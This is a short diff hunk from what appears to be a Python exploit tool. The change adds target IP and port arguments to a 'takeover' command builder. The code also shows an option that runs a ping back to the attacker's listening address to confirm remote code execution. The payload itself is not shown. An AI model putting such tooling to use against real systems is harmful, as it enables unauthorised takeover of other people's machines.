@@ -110,7 +110,7 @@ if (args.overlay_leak_command != None):
 
 if (args.takeover):
     import takeover
-    exe_cmd = takeover.takeover_cmd(listen_ip, listen_port, args.webserve)
+    exe_cmd = takeover.takeover_cmd(listen_ip, listen_port, target_ip, target_port, args.webserve)
 else:
     if (args.icmp):
         exe_cmd = f"ping {listen_ip}"
